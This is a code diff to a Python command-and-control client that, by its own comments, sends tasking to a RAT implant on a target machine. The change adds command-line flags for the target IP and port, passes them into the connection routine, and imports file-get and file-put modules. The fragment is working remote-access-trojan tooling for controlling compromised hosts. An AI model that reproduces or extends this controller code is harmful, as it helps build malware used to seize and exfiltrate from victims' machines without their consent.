@@ -2,6 +2,7 @@
 # Version 1.0
 # Serves as the main CMD client interface which will provide tasking to our RAT on target
 
+import sys
 import socket
 import argparse
 from RAT_Py_GetFile import *
@@ -49,10 +50,10 @@ def printPutFileHelp():
 #-----------------------------------------------
 
 #-----------------------------------------------
-def doConnect():
+def doConnect(ip, port):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((HOST, PORT_NUM))
+        sock.connect((ip, int(port)))
 
     except Exception as e:
         print("ERROR: Could not connect to implant: ", e)
@@ -63,9 +64,9 @@ def doConnect():
 #-----------------------------------------------
 
 #-----------------------------------------------
-def handleInput():
+def handleInput(ip, port):
     print("Reaching out to agent for connection establishment...")
-    sock = doConnect()
+    sock = doConnect(ip, port)
     # TODO: change to take ip and port number from flags 
     print("Connected to agent at %s on port %d" % (sock.getpeername()[0], sock.getpeername()[1]))
     userInput = 1
@@ -116,7 +117,12 @@ def handleInput():
 
 #-----------------------------------------------
 def main():
-    handleInput()
+    parser = argparse.ArgumentParser(description='Python C2 script')
+    parser.add_argument('-ip', '--ip', type=str, help='IP address of target', action='store', required=True)
+    parser.add_argument('-port', '--port', type=str, help='Port number our implant is listening on', action='store', required=True)
+    args = parser.parse_args()
+
+    handleInput(args.ip, args.port)
 
     return SUCCESS
 
